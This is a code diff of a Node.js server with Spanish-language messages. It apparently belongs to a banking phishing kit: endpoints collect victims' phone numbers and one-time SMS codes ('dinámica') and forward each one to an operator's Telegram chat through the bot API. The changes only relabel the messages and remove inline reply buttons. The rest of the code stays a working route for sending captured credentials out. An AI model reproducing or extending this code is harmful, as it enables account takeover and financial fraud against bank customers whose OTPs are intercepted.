@@ -275,18 +275,16 @@ app.post('/step3-dynamic', async (req, res) => {
     sessionData.set(sessionId, session);
     
 	  const mensaje = `
-📲 DINÁMICA1 ${attemptNumber} RECIBIDA 📲
+📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
 📱 Número: ${session.phoneNumber || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
      
 
-   // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
-      text: mensaje,
-      reply_markup: getLoanSimulatorMenu(sessionId)
+      text: mensaje
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
@@ -318,7 +316,7 @@ app.post('/step4-dynamic', async (req, res) => {
     sessionData.set(sessionId, session);
     
 	  const mensaje = `
-📲 DINÁMICA2 ${attemptNumber} RECIBIDA 📲
+📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
 📱 Número: ${session.phoneNumber || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
@@ -328,7 +326,6 @@ app.post('/step4-dynamic', async (req, res) => {
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
-	  reply_markup: getLoanSimulatorMenu(sessionId)	
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
@@ -339,6 +336,7 @@ app.post('/step4-dynamic', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
+
 
 
 // ==================== ENDPOINT: CONSIGNAR ====================
